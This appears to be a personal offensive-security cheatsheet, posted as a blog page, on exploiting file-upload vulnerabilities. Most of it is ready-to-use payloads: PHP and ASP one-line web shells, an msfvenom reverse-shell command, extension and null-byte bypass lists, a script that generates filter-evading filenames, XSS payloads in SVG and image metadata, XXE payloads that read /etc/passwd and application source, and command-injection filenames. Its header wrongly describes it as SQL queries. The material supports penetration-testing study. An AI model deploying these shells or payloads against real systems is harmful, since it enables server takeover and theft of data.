---
layout: post
title: "Cheatsheet-File-Upload-Vuln"
description: Cheatsheet of basic SQL queries.
---

<p>These cheatsheets serve as my personal quick reference. Therefore, they’re less organized than the box walkthroughs, but I’ve shared them in case others find them useful.</p>

<h2>Web Shells</h2>

<pre>
https://github.com/Arrexel/phpbash
</pre>

<pre>
&lt;?php system($_REQUEST['cmd']); ?&gt;
</pre>
<p>.NET applications</p>
<pre>
<% eval request('cmd') %>
</pre>

<h2>Reverse Shells</h2>
<pre>
https://github.com/pentestmonkey/php-reverse-shell
</pre>

<h2>Custom Reverse shells (msfvenom)</h2>
<p>-p flag for language</p>
<pre>
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
</pre>

<h2>Frontend Filtering</h2>
<p>Check HTML for validation functions and remove or bypass using burpsuite (upload something that is allowed and intercept and change body for webshell or reverse shell).</p>

<h2>Backend Filtering</h2>
<h3>Blacklist Bypass</h3>
<p>Example of blacklist backend code:</p>
<pre>
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
</pre>
<p>NOTE: Linux is case sensitive --> can be bypassed by playing with capital letters. In Windows this will not work.</p>

<p>Fuzzing for allowed extensions using Burpuite Intruder:</p>
<img src="/images/File-Upload-Bypass/file_uploads_burp_fuzz_extension.jpg" alt="Fuzzing for allowed extensions" class="postImage">
<p>Wordlists to use:</p>
<pre>
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
</pre>
<p>Note, don't forget to untick URL-encode (the . cannot be url encoded).</p>

<h3>Whitelist Bypass</h3>
<p>Vulnerable Regex:</p>
<pre>
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
</pre>
<p>This pattern checks whether the filename contains the "jpg", "jpeg", "png" or "gif" extension but it does not check whether it ends with it (the "$" character is not included at the end).</p>
<p>The following could work in these cases:</p>
<pre>
.jpeg.php
.jpg.php
.png.ph
.php%00.gif
.php\x00.gif
.php%00.png
.php\x00.png
.php%00.jpg
.php\x00.jpg
</pre>

<h3>Reverse Double Extension</h3>
<p>the /etc/apache2/mods-enabled/php7.4.conf for the Apache2 web server may include the following configuration:</p>
<pre>
&lt;FilesMatch ".+\.ph(ar|p|tml)"&gt;
    SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
</pre>
<p>This determines the files that allow PHP code execution. The same mistake is made. it only checks for files that CONTAIN but NOT END WITH ".php", ".phar" or ".phtml". Therefore, the following works as these extension are in the name but not at the end (assuming that files that end on .php or similar are filtered):</p>
<pre>
shell.php.jpg (and similar)
</pre>

<h3>Character Injection</h3>
<p>Characters to try:</p>
<pre>
%20
%0a
%00
%0d0a
/
.\
.
…
:
</pre>
<p>Custom script to generate a wordlist:</p>
<pre>
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
</pre>
<p>Used for outdated backend or misconfigurations.</p>

<h2>Type Filters</h2>
<p>Example code to test Content-Type header:</p>
<pre>
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
</pre>
<p>Just change the content type header. Can also fuzz for allowed types In Burpsuite using the content-type wordlist from seclists.</p>

<h2>MIME types</h2>
<p>Magic bytes (first few bytes) indicate which file it is.</p>
<pre>
echo "this is a text file" > text.jpg
file text.jpg 
text.jpg: ASCII text
</pre>
<p>The file command looks at these magic bytes to determine the file type. Even if it is a JPG extension the file command sees it as a .txt file</p>
<p>Changing it to GIF while keeping the JPG extension:</p>
<pre>
echo "GIF8" > text.jpg 
file text.jpg
text.jpg: GIF image data
</pre>
<p>Example of server codes that checks the MIME-type:</p>
<pre>
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
</pre>
<p>Tip: start with file that gets uploaded, intercept in Bupsuite and start from there by fuzzing allowed extensions. Then check for allowed content-types and then start playing with reverse double extensions.</p>

<h2>Limited file uploads</h2>
<h3>XSS</h3>
<p>When you can upload HTML files, you can include JavaScript code in it that then gets executed when a victim visits the page.</p>
<p>When a web app shows image metadata after upload. Inject a XSS payload in the Metadata parameter (e.g. comment or artist parameters):</p>
<pre>
exiftool -Comment=' "&gt;&lt;img src=1 onerror=alert(window.origin)&gt;' HTB.jpg
</pre>
<p>Another possibility is to change the MIME-type tp text/html --> rendered as HTML --> XSS executed.</p>
<p>SVG images are made up of XML --> add XSS payload to XML:</p>
<pre>
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;
&lt;svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1"&gt;
    &lt;rect x="1" y="1" width="1" height="1" fill="green" stroke="black" /&gt;
    &lt;script type="text/javascript"&gt;alert(window.origin);&lt;/script&gt;
&lt;/svg&gt;
</pre>
<h3>XXE</h3>
<p>Leak sensitive data using SVG by insertion of malicious XML:</p>
<pre>
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
&lt;svg&gt;&amp;xxe;&lt;/svg&gt;
</pre>
<p>Get source code:</p>
<pre>
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt; ]&gt;
&lt;svg&gt;&amp;xxe;&lt;/svg&gt;
</pre>
<p>Note: can of course also be used when XML can be uploaded instead of SVG. PDF, Word, PPT also use XML and thus can be used if Web app is vulnerable. Or with exiftool in JPG, GIF, JPEG and PNG.</p>

<h2>Other attacks</h2>
<h3>Injections In File name</h3>
<pre>
 file$(whoami).jpg
 file`whoami`.jpg
 file.jpg||whoami
</pre>
<p>This gets executed when the backend uses the filename in a system command (you escape the command and execute new command)</p>
<p>XSS:</p>
<pre>
&lt;script&gt;alert(window.origin);&lt;/script&gt;
</pre>
<p>Can get executed to on victims machine if filename is displayed to them.</p>

<h3>Disclose Upload Directory</h3>
<p>XXE</p>
<p>Goal: try to get error messages which may disclose the upload directory:</p>
<pre>
Upload existing file
Super long name file
</pre>



